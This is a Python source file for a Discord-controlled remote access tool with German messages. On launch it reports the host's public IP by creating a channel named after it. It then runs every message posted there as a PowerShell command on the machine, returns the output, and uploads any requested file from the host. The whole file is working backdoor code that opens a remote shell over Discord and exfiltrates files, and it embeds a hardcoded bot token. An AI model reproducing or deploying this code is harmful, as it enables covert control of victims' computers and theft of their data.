import discord
import requests
import subprocess
import os
import asyncio


bot_token = "MTQ2NDk3ODgzNzUzMTI2MzE2Mw.G-MDVU.5CPa9GBibZt64M8jArFIYgEktFA294bKJX0DM0"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)


current_working_directory = os.getcwd()
channel_id = None 

class PowerShellSession:
    def __init__(self):

        self.proc = subprocess.Popen(
            ["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

    def execute(self, cmd):
        marker = "---END_OF_COMMAND_MARKER---"
        full_cmd = f"{cmd} | Out-String; echo '{marker}'; $PWD.Path\n"
        
        try:
            self.proc.stdin.write(full_cmd)
            self.proc.stdin.flush()
        except Exception as e:
            return f"Fehler beim Senden: {e}", None

        output_lines = []
        new_path = None


        while True:
            line = self.proc.stdout.readline()
            if not line:
                break
            
            clean_line = line.strip()
            if clean_line == marker:

                new_path = self.proc.stdout.readline().strip()
                break
            else:
                output_lines.append(line)

        return "".join(output_lines).strip(), new_path


ps = PowerShellSession()

@client.event
async def on_ready():
    global channel_id
    if client.guilds:
        guild = client.guilds[0]
        try:
            ip = requests.get("https://api.ipify.org").text.replace(".", "-")
            channel = await guild.create_text_channel(f"bot-{ip}")
            channel_id = channel.id
            print(f"Eingeloggt als {client.user}. Channel #{channel.name} erstellt.")
        except Exception as e:
            print(f"Fehler beim Starten: {e}")

@client.event
async def on_message(message):
    global current_working_directory
    global channel_id

    if message.author.bot or message.channel.id != channel_id:
        return

    if message.content.startswith("download "):
        filename = message.content[9:].strip()
        
        if os.path.isabs(filename):
            file_path = filename
        else:
            file_path = os.path.normpath(os.path.join(current_working_directory, filename))

        forbidden = ["C:\\Windows", "C:\\System32"]
        if any(file_path.lower().startswith(d.lower()) for d in forbidden):
            await message.channel.send("❌ Systemverzeichnisse sind gesperrt.")
            return

        if os.path.exists(file_path) and os.path.isfile(file_path):
            if os.path.getsize(file_path) > 8 * 1024 * 1024:
                await message.channel.send("⚠️ Datei zu groß (> 8MB).")
            else:
                await message.channel.send(f"📤 Sende Datei: `{os.path.basename(file_path)}`", file=discord.File(file_path))
        else:
            await message.channel.send(f"❌ Datei nicht gefunden: `{file_path}`")

    else:
        loop = asyncio.get_event_loop()
        output, new_path = await loop.run_in_executor(None, ps.execute, message.content)

        if new_path:
            current_working_directory = new_path

        if not output:
            await message.channel.send(f"✅ Befehl ausgeführt.\nStandort: `{current_working_directory}`")
        else:
            if len(output) > 1900:
                with open("result.txt", "w", encoding="utf-8") as f:
                    f.write(output)
                await message.channel.send("📄 Ergebnis war zu lang, hier als Datei:", file=discord.File("result.txt"))
                os.remove("result.txt")
            else:
                await message.channel.send(f"```powershell\n{output}\n```\n📍 `{current_working_directory}`")

client.run(bot_token)